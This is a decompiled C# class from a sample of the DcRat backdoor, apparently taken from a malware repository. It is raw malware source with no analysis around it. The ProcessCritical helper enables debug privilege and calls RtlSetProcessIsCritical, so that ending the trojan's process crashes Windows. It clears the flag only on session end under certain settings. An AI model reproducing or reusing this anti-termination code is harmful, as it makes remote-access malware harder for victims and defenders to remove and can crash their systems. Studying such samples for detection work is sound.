// Decompiled with JetBrains decompiler
// Type: Client.Helper.ProcessCritical
// Assembly: Hau, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 43E252B6-B9CE-452D-8541-D8645EC414DC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.DcRat.gen-b46a6ed5d0d601aa0e1087095ddea928405c927d65ab795aca3a148d2fb37d13.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Threading;

namespace Client.Helper
{
  public static class ProcessCritical
  {
    public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
    {
      if (!Convert.ToBoolean(Settings.BS_OD) || !Methods.IsAdmin())
        return;
      ProcessCritical.Exit();
    }

    public static void Set()
    {
      try
      {
        SystemEvents.SessionEnding += new SessionEndingEventHandler(ProcessCritical.SystemEvents_SessionEnding);
        Process.EnterDebugMode();
        NativeMethods.RtlSetProcessIsCritical(1U, 0U, 0U);
      }
      catch
      {
      }
    }

    public static void Exit()
    {
      try
      {
        NativeMethods.RtlSetProcessIsCritical(0U, 0U, 0U);
      }
      catch
      {
        while (true)
          Thread.Sleep(100000);
      }
    }
  }
}
